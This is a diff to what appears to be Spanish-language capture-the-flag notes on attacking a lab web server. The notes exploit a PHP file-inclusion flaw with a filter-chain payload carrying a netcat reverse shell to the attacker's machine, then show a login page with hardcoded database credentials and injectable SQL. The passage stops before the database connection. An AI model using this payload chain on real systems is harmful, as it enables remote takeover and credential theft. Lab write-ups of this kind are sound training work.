@@ -305,3 +305,138 @@ www-data � P�������>==�@C������>==�@C
 la vulnerabilidad esta confirmada, intentare obtener la reverse shell 
 
 
+creo una reverse shell 
+
+sudo nc -lvnp 443
+
+genero el payload apuntando a mi maquina : 
+
+python3 php_filter_chain_generator.py --chain "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.138.111 443 >/tmp/f'); ?>" > payload.txt
+
+
+hago la peticion a la maquina victima
+
+curl -v "http://10.65.139.198/secret-script.php?file=$(cat payload.txt)"
+
+
+la reverse sehll cargo : 
+
+Connection received on 10.65.139.198 35450
+sh: 0: can't access tty; job control turned off
+$ pwd
+/var/www/html
+$ 
+ 
+
+encontre el script de la base de datos que hashea los md5, veo que sus credenciales estan ahi :
+
+
+$ ls
+adminpanel.css
+images
+index.html
+login.css
+login.php
+messages.html
+orders.html
+secret-script.php
+style.css
+supersecretadminpanel.html
+supersecretmessageforadmin
+users.html
+$ cat login.php
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <div class="login-container">
+        <h1>Login</h1>
+        
+        <form method="POST">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Login</button>
+        </form>
+        
+    </div>
+    <?php
+// Replace these with your database credentials
+$servername = "localhost";
+$user = "comte";
+$password = "VeryCheesyPassword";
+$dbname = "users";
+
+// Create a connection to the database
+$conn = new mysqli($servername, $user, $password, $dbname);
+
+// Check the connection
+if ($conn->connect_error) {
+    echo $conn->connect_error;
+    die("Connection failed: " . $conn->connect_error);
+
+}
+
+// Handle form submission
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $pass = $_POST["password"];
+    function filterOrVariations($input) {
+     //Use case-insensitive regular expression to filter 'OR', 'or', 'Or', and 'oR'
+    $filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
+    
+    return $filtered;
+}
+    $filteredInput = filterOrVariations($username);
+    //echo($filteredInput);
+    // Hash the password (you should use a stronger hashing algorithm)
+    $hashed_password = md5($pass);
+    
+    
+    // Query the database to check if the user exists
+    $sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
+    $result = $conn->query($sql);
+    $status = "";
+    if ($result->num_rows == 1) {
+        // Authentication successful
+        $status = "Login successful!";
+         header("Location: secret-script.php?file=supersecretadminpanel.html");
+         exit;
+    } else {
+        // Authentication failed
+         $status = "Login failed. Please check your username and password.";
+    }
+}
+// Close the database connection
+$conn->close();
+?>
+<div id = "status"><?php echo $status; ?></div>
+</body>
+</html>
+
+
+intentare ver si el puerto sql esta abierto para conectarme 
+
+$ ss -tlnp     
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
+LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*              
+LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*              
+LISTEN   0        10               0.0.0.0:4444          0.0.0.0:*              
+LISTEN   0        128              0.0.0.0:22            0.0.0.0:*              
+LISTEN   0        128                 [::]:22               [::]:*              
+LISTEN   0        511                    *:80                  *:*              
+$ 
+
+
+si, esta abierto, me conectare con las credenciales : 
+
